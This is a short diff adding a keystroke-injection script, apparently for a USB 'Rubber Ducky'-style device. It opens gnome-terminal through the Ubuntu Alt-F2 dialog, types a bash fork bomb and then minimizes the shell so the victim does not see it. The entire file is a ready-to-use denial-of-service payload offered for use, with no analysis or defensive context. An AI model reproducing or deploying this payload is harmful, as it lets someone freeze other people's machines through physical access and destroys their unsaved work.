@@ -1,0 +1,13 @@
+REM Runs a basic linux bash forkbomb. ctrl-alt-t doesn't work consistently for opening a terminal so alt-f2 and gnome-terminal used instead. tested on Ubuntu.
+
+DELAY 1000
+ALT F2
+DELAY 1000
+STRINGLN gnome-terminal
+DELAY 1000
+STRINGLN :(){ :|:& };:
+
+REM Minimize shell
+ALT SPACE n
+DELAY 1000
+ENTER
